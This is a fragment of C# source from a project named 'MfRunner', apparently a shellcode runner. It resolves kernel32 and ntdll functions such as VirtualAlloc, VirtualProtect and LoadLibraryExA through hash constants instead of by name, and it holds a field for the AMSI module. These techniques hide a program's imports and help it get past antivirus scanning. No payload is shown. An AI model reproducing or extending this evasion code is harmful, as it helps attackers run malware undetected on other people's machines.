using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace MfRunner
{
    internal partial class Program
    {
        public static long Kernel32Address;
        public static long NtdllAddress;
        public static long AmsiAddress;

        public static LoadLibraryExAFnType CustomLoadLibraryExA;
        //public static TimeBeginEndPeriodFnType CustomTimeBeginPeriod;
        //public static TimeBeginEndPeriodFnType CustomTimeEndPeriod;
        public static VirtualProtectFnType CustomVirtualProtect;
        public static VirtualAllocFnType CustomVirtualAlloc;
        public static RaiseExceptionFnType CustomRaiseException;

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr LoadLibraryExAFnType(string P1, IntPtr P2, uint P3);

        //[UnmanagedFunctionPointer(CallingConvention.StdCall)]
        //public delegate void TimeBeginEndPeriodFnType(int P1);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr VirtualAllocFnType(IntPtr P1, uint P2, uint P3, uint P4);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool VirtualProtectFnType(IntPtr P1, UIntPtr P2, uint P3, out uint P4);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool RaiseExceptionFnType(uint P1, uint P2, uint P3, IntPtr P4);


        static void InitializeNativeFunctions1()
        {
            Kernel32Address = (long)GetLoadedModuleAddress(0xF2758CCC); // kernel32.dll
            NtdllAddress    = (long)GetLoadedModuleAddress(0x117DC088); // ntdll.dll

            IntPtr LoadLibraryExAddress  = GetExportAddress(Kernel32Address, 0x42B89AA0); // LoadLibraryExA
            IntPtr VirtualAllocAddress   = GetExportAddress(Kernel32Address, 0xADBC5360); // VirtualAlloc
            IntPtr VirtualProtectAddress = GetExportAddress(Kernel32Address, 0xD52A4078); // VirtualProtect
            IntPtr RaiseExceptionAddress = GetExportAddress(Kernel32Address, 0x7E0E6975); // RaiseException

            CustomLoadLibraryExA = (LoadLibraryExAFnType)Marshal.GetDelegateForFunctionPointer(LoadLibraryExAddress,  typeof(LoadLibraryExAFnType));
            CustomVirtualAlloc   = (VirtualAllocFnType)  Marshal.GetDelegateForFunctionPointer(VirtualAllocAddress,   typeof(VirtualAllocFnType));
            CustomVirtualProtect = (VirtualProtectFnType)Marshal.GetDelegateForFunctionPointer(VirtualProtectAddress, typeof(VirtualProtectFnType));
            CustomRaiseException = (RaiseExceptionFnType)Marshal.GetDelegateForFunctionPointer(RaiseExceptionAddress, typeof(RaiseExceptionFnType));
        }

        /*static void InitializeNativeFunctions2()
        {
            IntPtr TimeBeginPeriodAddress = GetExportAddress(Kernel32Address, 0x9A1808DE); // TimeBeginPeriod
            IntPtr TimeEndPeriodAddress   = GetExportAddress(Kernel32Address, 0xE8AEBC43); // TimeEndPeriod

            CustomTimeBeginPeriod = (TimeBeginEndPeriodFnType)Marshal.GetDelegateForFunctionPointer(TimeBeginPeriodAddress, typeof(TimeBeginEndPeriodFnType));
            CustomTimeEndPeriod   = (TimeBeginEndPeriodFnType)Marshal.GetDelegateForFunctionPointer(TimeEndPeriodAddress,   typeof(TimeBeginEndPeriodFnType));
        }*/
    }
}
